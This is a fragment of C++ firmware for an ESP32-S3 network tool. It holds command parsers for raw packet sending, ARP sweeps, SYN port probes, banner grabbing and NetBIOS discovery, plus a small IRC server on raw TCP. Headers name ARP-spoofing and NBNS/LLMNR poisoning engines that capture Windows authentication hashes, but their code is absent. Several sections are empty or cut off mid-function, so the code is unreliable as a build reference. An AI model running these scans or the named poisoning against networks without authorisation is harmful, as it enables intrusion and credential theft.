  } else if (strncmp(cmd, "arp ", 4) == 0) {
    uint8_t targetIP[4];
    if (parseIP(cmd + 4, targetIP)) {
      sendArpRequest(targetIP);
    } else {
      Serial.println("[TX] Invalid IP. Use: send arp 192.168.1.1");
    }
  } else if (strncmp(cmd, "udp ", 4) == 0) {
    // Parse: udp X.X.X.X PORT message
    uint8_t targetIP[4];
    const char* p = cmd + 4;
    while (*p == ' ')
      p++;

    // Find end of IP
    const char* ipEnd = p;
    while (*ipEnd && *ipEnd != ' ')
      ipEnd++;

    // Parse IP from a temp buffer
    char ipStr[20];
    int ipLen = ipEnd - p;
    if (ipLen <= 0 || ipLen >= (int)sizeof(ipStr)) {
      Serial.println("[TX] Usage: send udp X.X.X.X PORT message");
      return;
    }
    memcpy(ipStr, p, ipLen);
    ipStr[ipLen] = '\0';

    if (!parseIP(ipStr, targetIP)) {
      Serial.println("[TX] Invalid IP. Usage: send udp X.X.X.X PORT message");
      return;
    }

    // Parse port
    p = ipEnd;
    while (*p == ' ')
      p++;
    int port = atoi(p);
    if (port <= 0 || port > 65535) {
      Serial.println("[TX] Invalid port. Usage: send udp X.X.X.X PORT message");
      return;
    }

    // Skip past port number to message
    while (*p && *p != ' ')
      p++;
    while (*p == ' ')
      p++;

    if (*p == '\0') {
      // No message, send empty UDP
      sendUDP(targetIP, (uint16_t)port, NULL, 0);
    } else {
      sendUDP(targetIP, (uint16_t)port, p, strlen(p));
    }
  } else if (strncmp(cmd, "raw ", 4) == 0) {
    sendRawHex(cmd + 4);
  } else {
    Serial.println();
    Serial.println("  SEND");
    Serial.println("  ─────────────────────────────────────────────");
    Serial.println("    send ping <IP>              ICMP echo request");
    Serial.println("    send arp <IP>               ARP who-has query");
    Serial.println("    send udp <IP> <PORT> <msg>  UDP packet");
    Serial.println("    send raw <HEXDATA>          Raw Ethernet frame");
    Serial.println();
  }
}

// parseFilterCommand and printCurrentFilter live in filter.cpp.

// ══════════════════════════════════════════
//  Parsers
// ══════════════════════════════════════════

// ══════════════════════════════════════════
//  Hardware & File I/O
// ══════════════════════════════════════════

void resetW5500() {
  pinMode(ETH_RST, OUTPUT);
  digitalWrite(ETH_RST, LOW);
  delay(50);
  digitalWrite(ETH_RST, HIGH);
  delay(200);
  Serial.println("[ETH] W5500 reset complete.");
}

// openNewCaptureFile, commitCaptureFile, writePcapGlobalHeader, writePcapPacket
// live in pcap_writer.cpp.

// IDS engine + 5 detectors live in ids.{h,cpp}.

// ══════════════════════════════════════════════════════════════
//  Network Recon Engine
// ══════════════════════════════════════════════════════════════

// ── Common ports for SYN probe ──
static const uint16_t commonPorts[] = {21,   22,   23,   25,   53,   80,   110, 111,
                                       135,  139,  143,  443,  445,  993,  995, 1433,
                                       1723, 3306, 3389, 5432, 5900, 8080, 8443};
static const uint8_t numCommonPorts = sizeof(commonPorts) / sizeof(commonPorts[0]);

// tcpChecksum is declared in eth_frame.h and defined in eth_frame.cpp.

// ── Build a TCP SYN packet, returns total frame length ──
// buildTcpSyn / buildTcpSynAck / buildTcpFinAck live in inject.cpp.


// ══════════════════════════════════════════
//  Recon Command Parser
// ══════════════════════════════════════════

void parseReconCommand(const char* cmd) {
  while (*cmd == ' ')
    cmd++;

  if (strncmp(cmd, "sweep", 5) == 0) {
    cmd += 5;
    while (*cmd == ' ')
      cmd++;

    uint8_t baseIP[4];
    int cidr = 24;  // default: /24

    if (*cmd == '\0') {
      // No argument — sweep our own subnet
      memcpy(baseIP, ourIP, 4);
      if (baseIP[0] == 0) {
        Serial.println("[RECON] No IP assigned yet. Run DHCP first.");
        return;
      }
    } else {
      // Parse: X.X.X.X or X.X.X.X/NN
      char ipStr[20];
      const char* slash = strchr(cmd, '/');
      int ipLen;

      if (slash) {
        ipLen = slash - cmd;
        if (ipLen <= 0 || ipLen >= (int)sizeof(ipStr)) {
          Serial.println("[RECON] Usage: recon sweep [X.X.X.X/NN]");
          return;
        }
        memcpy(ipStr, cmd, ipLen);
        ipStr[ipLen] = '\0';

        cidr = atoi(slash + 1);
        if (cidr < 16 || cidr > 30) {
          Serial.println("[RECON] CIDR must be between /16 and /30.");
          return;
        }
      } else {
        strncpy(ipStr, cmd, sizeof(ipStr) - 1);
        ipStr[sizeof(ipStr) - 1] = '\0';
        // Trim trailing spaces
        char* end = ipStr + strlen(ipStr) - 1;
        while (end > ipStr && *end == ' ')
          *end-- = '\0';
      }

      if (!parseIP(ipStr, baseIP)) {
        Serial.println("[RECON] Invalid IP. Usage: recon sweep 192.168.1.0/24");
        return;
      }
    }

    // Compute network base and broadcast from the CIDR
    uint32_t baseU32 = ((uint32_t)baseIP[0] << 24) | ((uint32_t)baseIP[1] << 16) |
                       ((uint32_t)baseIP[2] << 8) | (uint32_t)baseIP[3];
    uint32_t mask = (cidr == 0) ? 0 : (0xFFFFFFFFUL << (32 - cidr));
    uint32_t network = baseU32 & mask;
    uint32_t broadcast = network | ~mask;

    reconArpSweep(network, broadcast);
  } else if (strncmp(cmd, "ports", 5) == 0) {
    cmd += 5;
    while (*cmd == ' ')
      cmd++;

    if (*cmd == '\0') {
      Serial.println("[RECON] Usage: recon ports X.X.X.X [port1,port2,...]");
      return;
    }

    // Parse target IP
    uint8_t targetIP[4];
    char ipStr[20];
    const char* space = strchr(cmd, ' ');
    int ipLen;

    if (space) {
      ipLen = space - cmd;
    } else {
      ipLen = strlen(cmd);
    }

    if (ipLen <= 0 || ipLen >= (int)sizeof(ipStr)) {
      Serial.println("[RECON] Invalid IP.");
      return;
    }
    memcpy(ipStr, cmd, ipLen);
    ipStr[ipLen] = '\0';

    if (!parseIP(ipStr, targetIP)) {
      Serial.println("[RECON] Invalid IP.");
      return;
    }

    if (space && *(space + 1) != '\0') {
      // Parse comma-separated port list
      const char* portStr = space + 1;
      while (*portStr == ' ')
        portStr++;

      uint16_t customPorts[64];
      uint8_t numCustom = 0;

      while (*portStr && numCustom < 64) {
        int port = atoi(portStr);
        if (port > 0 && port <= 65535) {
          customPorts[numCustom++] = (uint16_t)port;
        }
        // Skip to next comma or end
        while (*portStr && *portStr != ',')
          portStr++;
        if (*portStr == ',')
          portStr++;
      }

      if (numCustom > 0) {
        reconSynProbe(targetIP, customPorts, numCustom);
      } else {
        Serial.println("[RECON] No valid ports specified.");
      }
    } else {
      // Use common ports
      reconSynProbe(targetIP, commonPorts, numCommonPorts);
    }
  } else if (strncmp(cmd, "vlan", 4) == 0) {
    reconVlanDiscover();
  } else if (strncmp(cmd, "stp", 3) == 0) {
    cmd += 3;
    while (*cmd == ' ')
      cmd++;
    if (strncmp(cmd, "on", 2) == 0) {
      stpMonitorEnabled = true;
      Serial.println("[STP] Live monitoring ENABLED (BPDUs will be printed)");
    } else if (strncmp(cmd, "off", 3) == 0) {
      stpMonitorEnabled = false;
      Serial.println("[STP] Live monitoring disabled");
    } else if (strncmp(cmd, "clear", 5) == 0) {
      stpInitTable();
      Serial.println("[STP] Bridge table cleared");
    } else {
      stpPrintTopology();
    }
  } else if (strncmp(cmd, "scan", 4) == 0) {
    cmd += 4;
    while (*cmd == ' ')
      cmd++;

    if (*cmd == '\0') {
      Serial.println("[RECON] Usage: recon scan X.X.X.X [port1,port2,...]");
      return;
    }

    uint8_t targetIP[4];
    char ipStr[20];
    const char* space = strchr(cmd, ' ');
    int ipLen = space ? (space - cmd) : strlen(cmd);

    if (ipLen <= 0 || ipLen >= (int)sizeof(ipStr)) {
      Serial.println("[RECON] Invalid IP.");
      return;
    }
    memcpy(ipStr, cmd, ipLen);
    ipStr[ipLen] = '\0';

    if (!parseIP(ipStr, targetIP)) {
      Serial.println("[RECON] Invalid IP.");
      return;
    }

    if (space && *(space + 1) != '\0') {
      const char* portStr = space + 1;
      while (*portStr == ' ')
        portStr++;

      uint16_t customPorts[64];
      uint8_t numCustom = 0;
      while (*portStr && numCustom < 64) {
        int port = atoi(portStr);
        if (port > 0 && port <= 65535)
          customPorts[numCustom++] = (uint16_t)port;
        while (*portStr && *portStr != ',')
          portStr++;
        if (*portStr == ',')
          portStr++;
      }
      if (numCustom > 0) {
        reconServiceScan(targetIP, customPorts, numCustom);
      }
    } else {
      reconServiceScan(targetIP, commonPorts, numCommonPorts);
    }
  } else if (strncmp(cmd, "lldp", 4) == 0 || strncmp(cmd, "cdp", 3) == 0) {
    lldpPrintTable();
  } else if (strncmp(cmd, "mdns", 4) == 0) {
    mdnsPrintTable();
  } else if (strncmp(cmd, "fingerprint", 11) == 0 || strncmp(cmd, "fp", 2) == 0) {
    fpPrintTable();
  } else if (strncmp(cmd, "netbios", 7) == 0) {
    cmd += 7;
    while (*cmd == ' ')
      cmd++;
    if (*cmd == '\0') {
      // No argument — show table or sweep
      if (netbiosCount > 0) {
        netbiosPrintTable();
      } else {
        Serial.println("[NETBIOS] No hosts discovered yet. Starting sweep...");
        reconNetbiosSweep();
      }
    } else if (strncmp(cmd, "sweep", 5) == 0) {
      reconNetbiosSweep();
    } else if (strncmp(cmd, "clear", 5) == 0) {
      memset(netbiosTable, 0, sizeof(netbiosTable));
      netbiosCount = 0;
      Serial.println("[NETBIOS] Table cleared");
    } else {
      // Assume it's an IP — do NBSTAT query
      uint8_t targetIP[4];
      if (parseIP(cmd, targetIP)) {
        reconNbstat(targetIP);
      } else {
        Serial.println("[NETBIOS] Usage:");
        Serial.println("  recon netbios              - show discovered hosts / sweep");
        Serial.println("  recon netbios sweep        - broadcast name query sweep");
        Serial.println("  recon netbios X.X.X.X      - NBSTAT name table query");
        Serial.println("  recon netbios clear        - clear table");
      }
    }
  } else {
    Serial.println();
    Serial.println("  RECON");
    Serial.println("  ───────────────────────────────────────────────────");
    Serial.println("    sweep [IP/24]          ARP host discovery");
    Serial.println("    ports <IP> [p,p,p]     TCP SYN port probe");
    Serial.println("    scan  <IP> [p,p,p]     Service scan + banner grab");
    Serial.println("    vlan                   802.1Q VLAN discovery");
    Serial.println("    stp [on|off|clear]     Spanning Tree topology");
    Serial.println("    lldp                   LLDP/CDP switch neighbors");
    Serial.println("    mdns                   mDNS/NBNS host discovery");
    Serial.println("    netbios [IP|sweep]     NetBIOS name table / sweep");
    Serial.println("    fingerprint            Passive OS fingerprinting");
    Serial.println();
  }
}

// ══════════════════════════════════════════════════════════════
//  Service Scanner — TCP handshake + banner grab
// ══════════════════════════════════════════════════════════════

// ── Resolve target MAC (ARP table lookup or ARP request) ──


// pktRead32 lives in eth_frame.h as a static inline helper.



// ══════════════════════════════════════════════════════════════
//  ARP Spoofing / MitM Engine

// ══════════════════════════════════════════════════════════════
//  Live Packet Stats Dashboard
// ══════════════════════════════════════════════════════════════
// Tracks packets/sec, protocol breakdown, top talkers by IP,
// and total bytes. Reset with `stats reset`.

void statsReset() {
  memset(statsTalkers, 0, sizeof(statsTalkers));
  statsWindowStart = millis();
  statsWindowPkts = 0;
  statsWindowBytes = 0;
  statsProtoTCP = 0;


// ══════════════════════════════════════════════════════════════

// ══════════════════════════════════════════════════════════════
//  Persistent Config (ESP32 NVS)




// ══════════════════════════════════════════════════════════════
//  5. NBNS/LLMNR Poisoning
// ══════════════════════════════════════════════════════════════
// Responds to NBNS (port 137) and LLMNR (port 5355) name queries
// with our IP, capturing authentication hashes from Windows hosts.









// ══════════════════════════════════════════════════════════════
//  IRC Server — minimal RFC 1459 over raw TCP
// ══════════════════════════════════════════════════════════════

// Send a gratuitous ARP reply announcing our IP→MAC binding
void sendGratuitousArp() {
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint16_t pos = 0;
  pos = buildEthHeader(txBuf, broadcast, ETHERTYPE_ARP);

  pktWrite16(txBuf + pos, 0x0001);
  pos += 2;
  pktWrite16(txBuf + pos, 0x0800);
  pos += 2;
  txBuf[pos++] = 6;
  txBuf[pos++] = 4;
  pktWrite16(txBuf + pos, 0x0002);
  pos += 2;
  memcpy(txBuf + pos, mac, 6);
  pos += 6;
  memcpy(txBuf + pos, ourIP, 4);
  pos += 4;
  memcpy(txBuf + pos, broadcast, 6);
  pos += 6;
  memcpy(txBuf + pos, ourIP, 4);
  pos += 4;
  while (pos < 60)
    txBuf[pos++] = 0;
  sendRawFrame(txBuf, pos);
}

// ── Find client by peer IP + port ──
static int8_t ircFindClient(const uint8_t* ip, uint16_t port) {
  for (uint8_t i = 0; i < IRC_MAX_CLIENTS; i++) {
    if (ircClients[i].tcpState != IRC_TCP_FREE && memcmp(ircClients[i].peerIP, ip, 4) == 0 &&
        ircClients[i].peerPort == port)
      return i;
  }
  return -1;
}

// ── Find client by nick ──
static int8_t ircFindNick(const char* nick) {
  for (uint8_t i = 0; i < IRC_MAX_CLIENTS; i++) {
    if (ircClients[i].tcpState == IRC_TCP_ESTABLISHED && ircClients[i].regState == IRC_REG_DONE &&
        strcasecmp(ircClients[i].nick, nick) == 0)
      return i;
  }
  return -1;
}

// ── Find channel by name ──
static int8_t ircFindChannel(const char* name) {
  for (uint8_t i = 0; i < IRC_MAX_CHANNELS; i++) {
    if (ircChannels[i].active && strcasecmp(ircChannels[i].name, name) == 0)
      return i;
  }
  return -1;
}

// ── Send raw TCP data to a connected client ──
void ircSendToClient(uint8_t idx, const char* data, uint16_t len) {
  IrcClient& c = ircClients[idx];
  if (c.tcpState != IRC_TCP_ESTABLISHED || len == 0)
    return;

  uint16_t frameLen = buildTcpDataPush(txBuf, c.peerMAC, ourIP, c.peerIP, IRC_PORT, c.peerPort,
                                       c.mySeq, c.myAck, (const uint8_t*)data, len);
  sendRawFrame(txBuf, frameLen);
  c.mySeq += len;
}

// ── Send a formatted IRC line to a client ──
void ircSendLine(uint8_t idx, const char* fmt, ...) {
  char buf[IRC_LINE_BUF];
  va_list args;
  va_start(args, fmt);
  int n = vsnprintf(buf, sizeof(buf) - 2, fmt, args);
  va_end(args);
  if (n < 0)
    return;
  if (n > (int)sizeof(buf) - 3)
    n = sizeof(buf) - 3;
  buf[n++] = '\r';
  buf[n++] = '\n';
  ircSendToClient(idx, buf, (uint16_t)n);
}

// ── Broadcast to all members of a channel (except one) ──
void ircBroadcastChannel(uint8_t chanIdx, uint8_t exceptClient, const char* fmt, ...) {
  char buf[IRC_LINE_BUF];
  va_list args;
  va_start(args, fmt);
  int n = vsnprintf(buf, sizeof(buf) - 2, fmt, args);
  va_end(args);
  if (n < 0)
    return;
  if (n > (int)sizeof(buf) - 3)
    n = sizeof(buf) - 3;
  buf[n++] = '\r';
  buf[n++] = '\n';

  uint8_t mask = ircChannels[chanIdx].memberMask;
  for (uint8_t i = 0; i < IRC_MAX_CLIENTS; i++) {
    if (i != exceptClient && (mask & (1 << i)) && ircClients[i].tcpState == IRC_TCP_ESTABLISHED) {
      ircSendToClient(i, buf, (uint16_t)n);
    }
  }
}

// ── Broadcast to all channels a client is in (for QUIT, etc.) ──
static void ircBroadcastAllChannels(uint8_t idx, const char* fmt, ...) {
  char buf[IRC_LINE_BUF];
  va_list args;
  va_start(args, fmt);
  int n = vsnprintf(buf, sizeof(buf) - 2, fmt, args);
  va_end(args);
  if (n < 0)
    return;
  if (n > (int)sizeof(buf) - 3)
    n = sizeof(buf) - 3;
  buf[n++] = '\r';
  buf[n++] = '\n';

  // Collect all clients in shared channels, excluding sender
  uint8_t sentMask = 0;
  for (uint8_t ch = 0; ch < IRC_MAX_CHANNELS; ch++) {
    if (!ircChannels[ch].active || !(ircChannels[ch].memberMask & (1 << idx)))
      continue;
    uint8_t members = ircChannels[ch].memberMask;
    for (uint8_t i = 0; i < IRC_MAX_CLIENTS; i++) {
      if (i != idx && (members & (1 << i)) && !(sentMask & (1 << i)) &&
          ircClients[i].tcpState == IRC_TCP_ESTABLISHED) {
        ircSendToClient(i, buf, (uint16_t)n);
        sentMask |= (1 << i);
      }
    }
  }
}

// ── Send IRC welcome numerics ──
void ircSendWelcome(uint8_t idx) {
  IrcClient& c = ircClients[idx];
  ircSendLine(idx, ":%s 001 %s :Welcome to the %s IRC network, %s!%s@%u.%u.%u.%u", IRC_SERVER_NAME,
              c.nick, IRC_SERVER_NAME, c.nick, c.user, c.peerIP[0], c.peerIP[1], c.peerIP[2],
              c.peerIP[3]);
  ircSendLine(idx, ":%s 002 %s :Your host is %s, running eth0-ircd v0.1", IRC_SERVER_NAME, c.nick,
              IRC_SERVER_NAME);
  ircSendLine(idx, ":%s 003 %s :This server was created on an ESP32-S3", IRC_SERVER_NAME, c.nick);
  ircSendLine(idx, ":%s 004 %s %s eth0-ircd-0.1 o o", IRC_SERVER_NAME, c.nick, IRC_SERVER_NAME);
  ircSendLine(idx, ":%s 005 %s CHANTYPES=# NICKLEN=%d CHANMODES=,,,nt :are supported",
              IRC_SERVER_NAME, c.nick, IRC_NICK_LEN - 1);
  ircSendLine(idx, ":%s 375 %s :- %s Message of the Day -", IRC_SERVER_NAME, c.nick,
              IRC_SERVER_NAME);
  ircSendLine(idx, ":%s 372 %s :- ESP32-S3-ETH network security tool", IRC_SERVER_NAME, c.nick);
  ircSendLine(idx, ":%s 372 %s :- Running on raw W5500 MACRAW — no TCP stack", IRC_SERVER_NAME,
              c.nick);
  ircSendLine(idx, ":%s 372 %s :- Max %d clients, %d channels. Be kind.", IRC_SERVER_NAME, c.nick,
              IRC_MAX_CLIENTS, IRC_MAX_CHANNELS);
  ircSendLine(idx, ":%s 376 %s :End of /MOTD command", IRC_SERVER_NAME, c.nick);
}

// ── Disconnect a client ──
void ircDisconnect(uint8_t idx, const char* reason) {
  IrcClient& c = ircClients[idx];
  if (c.tcpState == IRC_TCP_FREE)
    return;

  // Notify shared channels
  if (c.regState == IRC_REG_DONE) {
    ircBroadcastAllChannels(idx, ":%s!%s@%u.%u.%u.%u QUIT :%s", c.nick, c.user, c.peerIP[0],
                            c.peerIP[1], c.peerIP[2], c.peerIP[3], reason);
  }

  // Remove from all channels
  for (uint8_t ch = 0; ch < IRC_MAX_CHANNELS; ch++) {
    ircChannels[ch].memberMask &= ~(1 << idx);
    if (ircChannels[ch].active && ircChannels[ch].memberMask == 0)
      ircChannels[ch].active = false;  // Auto-destroy empty channel
  }

  // Send ERROR and RST
  if (c.tcpState == IRC_TCP_ESTABLISHED) {
    char errMsg[128];
    int n = snprintf(errMsg, sizeof(errMsg), "ERROR :Closing Link: %s (%s)\r\n", c.nick, reason);
    if (n > 0)
      ircSendToClient(idx, errMsg, (uint16_t)n);
    delay(5);
    uint16_t f = buildTcpRst(txBuf, c.peerMAC, ourIP, c.peerIP, IRC_PORT, c.peerPort, c.mySeq);
    sendRawFrame(txBuf, f);
  }

  Serial.printf("[IRC] Client %u disconnected (%s): %s\n", idx, c.nick[0] ? c.nick : "unregistered",
                reason);

  memset(&c, 0, sizeof(IrcClient));
}

// ── Process one complete IRC line from a client ──
void ircProcessLine(uint8_t idx, char* line) {
  IrcClient& c = ircClients[idx];
  c.lastActivity = millis();

  // Strip trailing \r\n
  int len = strlen(line);
  while (len > 0 && (line[len - 1] == '\r' || line[len - 1] == '\n'))
    line[--len] = '\0';
  if (len == 0)
    return;

  // Skip optional prefix (messages from client shouldn't have one, but tolerate it)
  char* cmd = line;
  if (*cmd == ':') {
    cmd = strchr(cmd, ' ');
    if (!cmd)
      return;
    while (*cmd == ' ')
      cmd++;
  }

  // Extract command and params
  char* params = strchr(cmd, ' ');
  if (params) {
    *params = '\0';
    params++;
    while (*params == ' ')
      params++;
  }

  // ── CAP (capability negotiation — acknowledge and move on) ──
  if (strcasecmp(cmd, "CAP") == 0) {
    if (params && strncasecmp(params, "LS", 2) == 0) {
      ircSendLine(idx, ":%s CAP * LS :", IRC_SERVER_NAME);
    }
    // CAP END — just ignore, registration continues normally
    return;
  }

  // ── NICK ──
  if (strcasecmp(cmd, "NICK") == 0) {
    if (!params || !params[0]) {
      ircSendLine(idx, ":%s 431 * :No nickname given", IRC_SERVER_NAME);
      return;
    }
    // Truncate
    char newNick[IRC_NICK_LEN];
    strncpy(newNick, params, IRC_NICK_LEN - 1);
    newNick[IRC_NICK_LEN - 1] = '\0';

    // Check collision
    int8_t existing = ircFindNick(newNick);
    if (existing >= 0 && existing != idx) {
      ircSendLine(idx, ":%s 433 %s %s :Nickname is already in use", IRC_SERVER_NAME,
                  c.nick[0] ? c.nick : "*", newNick);
      return;
    }

    // If already registered, broadcast nick change
    if (c.regState == IRC_REG_DONE) {
      ircBroadcastAllChannels(idx, ":%s!%s@%u.%u.%u.%u NICK :%s", c.nick, c.user, c.peerIP[0],
                              c.peerIP[1], c.peerIP[2], c.peerIP[3], newNick);
      ircSendLine(idx, ":%s!%s@%u.%u.%u.%u NICK :%s", c.nick, c.user, c.peerIP[0], c.peerIP[1],
                  c.peerIP[2], c.peerIP[3], newNick);
    }

    strcpy(c.nick, newNick);
    c.regState = (IrcRegState)(c.regState | IRC_REG_NICK);

    if (c.regState == IRC_REG_DONE) {
      // First-time registration complete
      ircSendWelcome(idx);
      Serial.printf("[IRC] Client %u registered as %s\n", idx, c.nick);
    }
    return;
  }

  // ── USER ──
  if (strcasecmp(cmd, "USER") == 0) {
    if (c.regState & IRC_REG_USER)
      return;  // Ignore duplicate USER
    if (!params || !params[0]) {
      ircSendLine(idx, ":%s 461 %s USER :Not enough parameters", IRC_SERVER_NAME,
                  c.nick[0] ? c.nick : "*");
      return;
    }
    // Extract just the username (first token)
    char* space = strchr(params, ' ');
    if (space)
      *space = '\0';
    strncpy(c.user, params, IRC_NICK_LEN - 1);
    c.user[IRC_NICK_LEN - 1] = '\0';
    c.regState = (IrcRegState)(c.regState | IRC_REG_USER);

    if (c.regState == IRC_REG_DONE) {
      ircSendWelcome(idx);
      Serial.printf("[IRC] Client %u registered as %s\n", idx, c.nick);
    }
    return;
  }

  // ── PASS (accept and ignore — no auth) ──
  if (strcasecmp(cmd, "PASS") == 0)
    return;

  // ── Everything below requires registration ──
  if (c.regState != IRC_REG_DONE) {
    ircSendLine(idx, ":%s 451 * :You have not registered", IRC_SERVER_NAME);
    return;
  }

  // ── PING ──
  if (strcasecmp(cmd, "PING") == 0) {
    ircSendLine(idx, ":%s PONG %s :%s", IRC_SERVER_NAME, IRC_SERVER_NAME,
                params ? params : IRC_SERVER_NAME);
    return;
  }

  // ── PONG ──
  if (strcasecmp(cmd, "PONG") == 0) {
    c.pongPending = false;
    return;
  }

  // ── JOIN ──
  if (strcasecmp(cmd, "JOIN") == 0) {
    if (!params || params[0] != '#') {
      ircSendLine(idx, ":%s 403 %s %s :No such channel", IRC_SERVER_NAME, c.nick,
                  params ? params : "*");
      return;
    }
    char chanName[IRC_CHAN_LEN];
    strncpy(chanName, params, IRC_CHAN_LEN - 1);
    chanName[IRC_CHAN_LEN - 1] = '\0';
    // Strip anything after a space or comma (multi-channel JOIN)
    char* sep = strpbrk(chanName, " ,");
    if (sep)
      *sep = '\0';

    int8_t ci = ircFindChannel(chanName);
    if (ci < 0) {
      // Create new channel
      for (uint8_t i = 0; i < IRC_MAX_CHANNELS; i++) {
        if (!ircChannels[i].active) {
          ci = i;
          ircChannels[i].active = true;
          strncpy(ircChannels[i].name, chanName, IRC_CHAN_LEN - 1);
          ircChannels[i].name[IRC_CHAN_LEN - 1] = '\0';
          ircChannels[i].memberMask = 0;
          break;
        }
      }
      if (ci < 0) {
        ircSendLine(idx, ":%s 405 %s %s :You have joined too many channels", IRC_SERVER_NAME,
                    c.nick, chanName);
        return;
      }
    }

    // Already a member?
    if (ircChannels[ci].memberMask & (1 << idx))
      return;

    ircChannels[ci].memberMask |= (1 << idx);
    c.channels |= (1 << ci);

    // Broadcast JOIN to channel (including joiner)
    ircBroadcastChannel(ci, 255, ":%s!%s@%u.%u.%u.%u JOIN %s", c.nick, c.user, c.peerIP[0],
                        c.peerIP[1], c.peerIP[2], c.peerIP[3], ircChannels[ci].name);

    // Send topic (332) — no topic set
    ircSendLine(idx, ":%s 331 %s %s :No topic is set", IRC_SERVER_NAME, c.nick,
                ircChannels[ci].name);

    // Send names list (353 + 366)
    char names[256] = {0};
    uint16_t npos = 0;
    for (uint8_t i = 0; i < IRC_MAX_CLIENTS; i++) {
      if ((ircChannels[ci].memberMask & (1 << i)) && ircClients[i].regState == IRC_REG_DONE) {
        if (npos > 0 && npos < sizeof(names) - IRC_NICK_LEN - 1)
          names[npos++] = ' ';
        int w = snprintf(names + npos, sizeof(names) - npos, "%s", ircClients[i].nick);
        if (w > 0)
          npos += w;
      }
    }
    ircSendLine(idx, ":%s 353 %s = %s :%s", IRC_SERVER_NAME, c.nick, ircChannels[ci].name, names);
    ircSendLine(idx, ":%s 366 %s %s :End of /NAMES list", IRC_SERVER_NAME, c.nick,
                ircChannels[ci].name);
    return;
  }

  // ── PART ──
  if (strcasecmp(cmd, "PART") == 0) {
    if (!params)
      return;
    char chanName[IRC_CHAN_LEN];
    strncpy(chanName, params, IRC_CHAN_LEN - 1);
    chanName[IRC_CHAN_LEN - 1] = '\0';
    char* sep = strpbrk(chanName, " ,");
    const char* reason = sep ? sep + 1 : "Leaving";
    if (sep)
      *sep = '\0';
    while (*reason == ' ' || *reason == ':')
      reason++;

    int8_t ci = ircFindChannel(chanName);
    if (ci < 0 || !(ircChannels[ci].memberMask & (1 << idx))) {
      ircSendLine(idx, ":%s 442 %s %s :You're not on that channel", IRC_SERVER_NAME, c.nick,
                  chanName);
      return;
    }

    ircBroadcastChannel(ci, 255, ":%s!%s@%u.%u.%u.%u PART %s :%s", c.nick, c.user, c.peerIP[0],
                        c.peerIP[1], c.peerIP[2], c.peerIP[3], ircChannels[ci].name, reason);

    ircChannels[ci].memberMask &= ~(1 << idx);
    c.channels &= ~(1 << ci);
    if (ircChannels[ci].memberMask == 0)
      ircChannels[ci].active = false;
    return;
  }

  // ── PRIVMSG / NOTICE ──
  if (strcasecmp(cmd, "PRIVMSG") == 0 || strcasecmp(cmd, "NOTICE") == 0) {
    if (!params)
      return;
    char* text = strchr(params, ' ');
    if (!text)
      return;
    *text++ = '\0';
    while (*text == ' ')
      text++;
    if (*text == ':')
      text++;

    if (params[0] == '#') {
      // Channel message
      int8_t ci = ircFindChannel(params);
      if (ci < 0 || !(ircChannels[ci].memberMask & (1 << idx))) {
        ircSendLine(idx, ":%s 404 %s %s :Cannot send to channel", IRC_SERVER_NAME, c.nick, params);
        return;
      }
      ircBroadcastChannel(ci, idx, ":%s!%s@%u.%u.%u.%u %s %s :%s", c.nick, c.user, c.peerIP[0],
                          c.peerIP[1], c.peerIP[2], c.peerIP[3], cmd, ircChannels[ci].name, text);
    } else {
      // Private message
      int8_t target = ircFindNick(params);
      if (target < 0) {
        ircSendLine(idx, ":%s 401 %s %s :No such nick/channel", IRC_SERVER_NAME, c.nick, params);
        return;
      }
      ircSendLine(target, ":%s!%s@%u.%u.%u.%u %s %s :%s", c.nick, c.user, c.peerIP[0], c.peerIP[1],
                  c.peerIP[2], c.peerIP[3], cmd, ircClients[target].nick, text);
    }
    return;
  }

  // ── WHO ──
  if (strcasecmp(cmd, "WHO") == 0) {
    if (params && params[0] == '#') {
      int8_t ci = ircFindChannel(params);
      if (ci >= 0) {
        for (uint8_t i = 0; i < IRC_MAX_CLIENTS; i++) {
          if ((ircChannels[ci].memberMask & (1 << i)) && ircClients[i].regState == IRC_REG_DONE) {
            ircSendLine(idx, ":%s 352 %s %s %s %u.%u.%u.%u %s H :0 %s", IRC_SERVER_NAME, c.nick,
                        ircChannels[ci].name, ircClients[i].user, ircClients[i].peerIP[0],
                        ircClients[i].peerIP[1], ircClients[i].peerIP[2], ircClients[i].peerIP[3],
                        ircClients[i].nick, ircClients[i].user);
          }
        }
      }
    }
    ircSendLine(idx, ":%s 315 %s %s :End of WHO list", IRC_SERVER_NAME, c.nick,
                params ? params : "*");
    return;
  }

  // ── WHOIS ──
  if (strcasecmp(cmd, "WHOIS") == 0) {
    if (!params)
      return;
    int8_t target = ircFindNick(params);
    if (target >= 0) {
      IrcClient& t = ircClients[target];
      ircSendLine(idx, ":%s 311 %s %s %s %u.%u.%u.%u * :%s", IRC_SERVER_NAME, c.nick, t.nick,
                  t.user, t.peerIP[0], t.peerIP[1], t.peerIP[2], t.peerIP[3], t.user);
    } else {
      ircSendLine(idx, ":%s 401 %s %s :No such nick", IRC_SERVER_NAME, c.nick, params);
    }
    ircSendLine(idx, ":%s 318 %s %s :End of WHOIS list", IRC_SERVER_NAME, c.nick, params);
    return;
  }

  // ── MODE ──
  if (strcasecmp(cmd, "MODE") == 0) {
    if (!params)
      return;
    if (params[0] == '#') {
      ircSendLine(idx, ":%s 324 %s %s +nt", IRC_SERVER_NAME, c.nick, params);
    } else {
      ircSendLine(idx, ":%s 221 %s +i", IRC_SERVER_NAME, c.nick);
    }
    return;
  }

  // ── QUIT ──
  if (strcasecmp(cmd, "QUIT") == 0) {
    const char* reason = (params && *params == ':') ? params + 1
                                                    : (params ? params : "Client Quit");
    ircDisconnect(idx, reason);
    return;
  }

  // ── USERHOST (some clients send this) ──
  if (strcasecmp(cmd, "USERHOST") == 0) {
    if (params) {
      int8_t target = ircFindNick(params);
      if (target >= 0) {
        ircSendLine(idx, ":%s 302 %s :%s=+%s@%u.%u.%u.%u", IRC_SERVER_NAME, c.nick,
                    ircClients[target].nick, ircClients[target].user, ircClients[target].peerIP[0],
                    ircClients[target].peerIP[1], ircClients[target].peerIP[2],
                    ircClients[target].peerIP[3]);
      }
    }
    return;
  }

  // ── Unknown command ──
  ircSendLine(idx, ":%s 421 %s %s :Unknown command", IRC_SERVER_NAME, c.nick, cmd);
}

// ── Handle incoming TCP packets for the IRC server ──
void ircCheckIncomingTcp(const uint8_t* pkt, uint16_t len) {
  if (len < ETH_HEADER_LEN + 40)
    return;

  // Ignore our own frames (MACRAW echo)
  if (memcmp(pkt + ETH_SRC_MAC, mac, 6) == 0)
    return;

  uint16_t etype = pktRead16(pkt + ETH_TYPE);
